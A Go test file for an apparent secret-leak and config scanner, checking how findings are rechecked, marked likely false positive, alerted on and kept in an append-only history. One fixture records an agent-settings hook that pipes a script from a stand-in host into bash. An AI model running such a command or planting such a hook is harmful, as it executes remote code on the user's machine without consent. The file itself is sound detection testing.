package secondcheck

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/stackurity/stackurity/internal/model"
	"github.com/stackurity/stackurity/internal/store"
	"github.com/stackurity/stackurity/internal/tenant"
	"github.com/stackurity/stackurity/internal/testdb"
)

func hostBatch(leaks []model.Leak, configs []model.ConfigFinding) *model.ObservationBatch {
	b := model.NewBatch(model.Collector{ID: "agent", Version: "1", Method: "agent"},
		model.AssetRef{Kind: model.AssetHost, Name: "web-1", Identifiers: []model.Identifier{{Scheme: "machine-id", Value: "m1"}},
			Attributes: map[string]string{"os": "debian"}})
	b.Observations = append(b.Observations, model.Observation{Purl: "pkg:deb/debian/bash@5.2", Location: "/var/lib/dpkg/status"})
	b.Cover("dpkg", "checked", "")
	b.Complete = true
	b.Leaks = &model.LeakScan{Found: leaks, Complete: true}
	b.ConfigFindings = &model.ConfigScan{Found: configs, Complete: true}
	b.ObservedAt = time.Now().UTC()
	return b
}

func hostLeak(c, path string, signals ...string) model.Leak {
	return model.Leak{Rule: "github-token", Title: "GitHub token", Severity: "critical", Path: path, Line: 2,
		Fingerprint: strings.Repeat(c, 32), Preview: "ghp_…" + strings.Repeat(c, 4),
		ValueCheck: &model.LeakValueCheck{Checker: "value/1", Signals: signals}}
}

func leakIncidents(t *testing.T, s *store.Store, ctx context.Context) []store.SystemIncident {
	t.Helper()
	sys, err := s.DetectSystemProblems(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var out []store.SystemIncident
	for _, i := range sys {
		if i.Kind == "leak" || i.Kind == "config" {
			out = append(out, i)
		}
	}
	return out
}

// A stored scan is checked as soon as it is stored; a likely false
// positive is listed with its reason but raises no alert; verdicts are
// kept as an append-only history that grows only when a verdict changes.
func TestRecheckLeaksAndSettings(t *testing.T) {
	ctx := tenant.WithWorkspace(context.Background(), tenant.DefaultWorkspace)
	pool := testdb.New(t)
	s := store.New(pool)
	r := &Runner{Store: s}
	s.AfterLeakScan = func(ctx context.Context, assetID int64) {
		if _, err := r.Recheck(ctx, assetID); err != nil {
			t.Error(err)
		}
	}
	placeholder := hostLeak("a", "/srv/app/deploy.sh", "placeholder")
	real := hostLeak("b", "/srv/app/run.sh", "checksum_valid")
	hook := model.ConfigFinding{Rule: "agent-hook-remote-exec", Category: model.ConfigAgentHook, Title: "hook", Severity: "high",
		Path: "/root/.claude/settings.json", Line: 4, Subject: "SessionStart: # curl https://x.example/i.sh | bash", Why: "w", Fix: "f",
		Fingerprint: strings.Repeat("c", 32)}
	res, err := s.Ingest(ctx, hostBatch([]model.Leak{placeholder}, []model.ConfigFinding{hook}), 0)
	if err != nil {
		t.Fatal(err)
	}
	ls, _, err := s.ListLeaks(ctx, store.LeakFilter{AssetID: res.AssetID})
	if err != nil || len(ls) != 1 {
		t.Fatal(ls, err)
	}
	l := ls[0]
	if l.SecondCheck == nil || l.SecondCheck.Verdict != store.VerdictLikelyFalsePositive || l.SecondCheck.Checker != store.LeakCheckRules ||
		!strings.Contains(l.SecondCheck.Reason, "placeholder") {
		t.Fatalf("leak second check: %+v", l.SecondCheck)
	}
	if strings.Join(l.ValueSignals, ",") != "placeholder" || l.ValueChecker != "value/1" {
		t.Errorf("value check stored as %q %v", l.ValueChecker, l.ValueSignals)
	}
	cs, _, err := s.ListConfigFindings(ctx, store.ConfigFindingFilter{AssetID: res.AssetID})
	if err != nil || len(cs) != 1 || cs[0].SecondCheck == nil || cs[0].SecondCheck.Verdict != store.VerdictLikelyFalsePositive {
		t.Fatalf("config second check: %+v %v", cs, err)
	}
	// Neither raises an alert, and both are counted.
	if incs := leakIncidents(t, s, ctx); len(incs) != 0 {
		t.Errorf("likely false positives raised %+v", incs)
	}
	if sum, err := s.SummariseLeaks(ctx, store.LeakFilter{}); err != nil || sum.LikelyFalsePositive != 1 {
		t.Errorf("leak summary %+v %v", sum, err)
	}
	if sum, err := s.SummariseConfigFindings(ctx, 0); err != nil || sum.LikelyFalsePositive != 1 {
		t.Errorf("config summary %+v %v", sum, err)
	}

	// A real key alerts; the filters split the two.
	if _, err := s.Ingest(ctx, hostBatch([]model.Leak{placeholder, real}, []model.ConfigFinding{hook}), 0); err != nil {
		t.Fatal(err)
	}
	if incs := leakIncidents(t, s, ctx); len(incs) != 1 || incs[0].Detail["count"] != 1 {
		t.Errorf("real key: %+v", incs)
	}
	for filter, want := range map[string]string{"confirmed": "/srv/app/run.sh", "likely_false_positive": "/srv/app/deploy.sh",
		"confirmed,fixed,could_not_check,unchecked": "/srv/app/run.sh"} {
		got, _, err := s.ListLeaks(ctx, store.LeakFilter{SecondCheck: filter})
		if err != nil || len(got) != 1 || got[0].Path != want {
			t.Errorf("second_check=%s: %+v %v", filter, got, err)
		}
	}
	if _, _, err := s.ListLeaks(ctx, store.LeakFilter{SecondCheck: "maybe"}); err == nil {
		t.Error("an unknown verdict was accepted")
	}

	// Seen again unchanged: checked again, nothing added to the history.
	hist, err := s.LeakVerdicts(ctx, l.ID)
	if err != nil || len(hist) != 1 {
		t.Fatalf("history after two scans: %+v %v", hist, err)
	}
	if hist[0].Inputs["path"] != "/srv/app/deploy.sh" {
		t.Errorf("history inputs: %v", hist[0].Inputs)
	}
	// The placeholder is replaced by a real key at the same place (a new
	// value, so a new leak), and the old one is gone: fixed is added.
	if _, err := s.Ingest(ctx, hostBatch([]model.Leak{real}, nil), 0); err != nil {
		t.Fatal(err)
	}
	hist, err = s.LeakVerdicts(ctx, l.ID)
	if err != nil || len(hist) != 2 || hist[0].Verdict != store.VerdictFixed || hist[1].Verdict != store.VerdictLikelyFalsePositive {
		t.Fatalf("history after the key went: %+v %v", hist, err)
	}
	// The history cannot be rewritten.
	if _, err := pool.Exec(ctx, `UPDATE second_check_verdicts SET verdict = 'confirmed'`); err == nil ||
		!strings.Contains(err.Error(), "append-only") {
		t.Errorf("a verdict was changed: %v", err)
	}
	if _, err := pool.Exec(tenant.System(context.Background()), `UPDATE second_check_verdicts SET reason = ''`); err == nil {
		t.Error("a verdict was changed by the system scope")
	}
	// Nothing is due now; the periodic run checks nothing.
	if waiting, err := s.RecheckWaiting(ctx); err != nil || waiting {
		t.Errorf("waiting after every row was checked: %v %v", waiting, err)
	}
	if st, err := r.Recheck(ctx, 0); err != nil || st.Checked != 0 {
		t.Errorf("periodic run: %+v %v", st, err)
	}
}

// The value check's signals are a fixed list: the database refuses
// anything else, so the column cannot carry the value.
func TestValueSignalsAreAFixedList(t *testing.T) {
	ctx := tenant.WithWorkspace(context.Background(), tenant.DefaultWorkspace)
	pool := testdb.New(t)
	s := store.New(pool)
	if _, err := s.Ingest(ctx, hostBatch([]model.Leak{hostLeak("a", "/srv/x.sh")}, nil), 0); err != nil {
		t.Fatal(err)
	}
	if _, err := pool.Exec(ctx, `UPDATE leaks SET value_signals = ARRAY['gh`+`p_abcdefghijklmnopqrstuvwxyz0123456789']`); err == nil {
		t.Error("a value was stored as a signal")
	}
	if _, err := pool.Exec(ctx, `UPDATE leaks SET value_checker = 'gh`+`p_abcdefghijklmnopqrstuvwxyz0123456789'`); err == nil {
		t.Error("a value was stored as the checker")
	}
	b := hostBatch([]model.Leak{hostLeak("a", "/srv/x.sh", "the-value")}, nil)
	if err := b.Validate(); err == nil || !strings.Contains(err.Error(), "not a known signal") {
		t.Errorf("a batch with an unknown signal: %v", err)
	}
}

// Only a value signal keeps a likely false positive from alerting. A leak
// that is likely a false positive only because of its file (a test or
// docs file) keeps its verdict and reason, and still alerts: real keys end
// up there too. Each value signal suppresses the alert on its own.
func TestPathOnlyFalsePositivesStillAlert(t *testing.T) {
	ctx := tenant.WithWorkspace(context.Background(), tenant.DefaultWorkspace)
	s := store.New(testdb.New(t))
	r := &Runner{Store: s}
	s.AfterLeakScan = func(ctx context.Context, assetID int64) {
		if _, err := r.Recheck(ctx, assetID); err != nil {
			t.Error(err)
		}
	}
	pathOnly := hostLeak("d", "/srv/app/tests/fixture.sh")
	if _, err := s.Ingest(ctx, hostBatch([]model.Leak{pathOnly}, nil), 0); err != nil {
		t.Fatal(err)
	}
	ls, _, err := s.ListLeaks(ctx, store.LeakFilter{})
	if err != nil || len(ls) != 1 || ls[0].SecondCheck == nil || ls[0].SecondCheck.Verdict != store.VerdictLikelyFalsePositive ||
		!strings.Contains(ls[0].SecondCheck.Reason, "in a test or docs file") ||
		!strings.Contains(ls[0].SecondCheck.Reason, "check whether the key is real") {
		t.Fatalf("path-only leak: %+v %v", ls, err)
	}
	if incs := leakIncidents(t, s, ctx); len(incs) != 1 || incs[0].Kind != "leak" {
		t.Errorf("a path-only likely false positive did not alert: %+v", incs)
	}
	for _, sig := range []string{"known_sample", "placeholder", "low_entropy", "test_mode_key", "checksum_invalid"} {
		// The same file, now with a value signal: no alert.
		withSignal := hostLeak("d", "/srv/app/tests/fixture.sh", sig)
		if _, err := s.Ingest(ctx, hostBatch([]model.Leak{withSignal}, nil), 0); err != nil {
			t.Fatal(err)
		}
		if incs := leakIncidents(t, s, ctx); len(incs) != 0 {
			t.Errorf("%s: a value-signal likely false positive alerted: %+v", sig, incs)
		}
	}
}
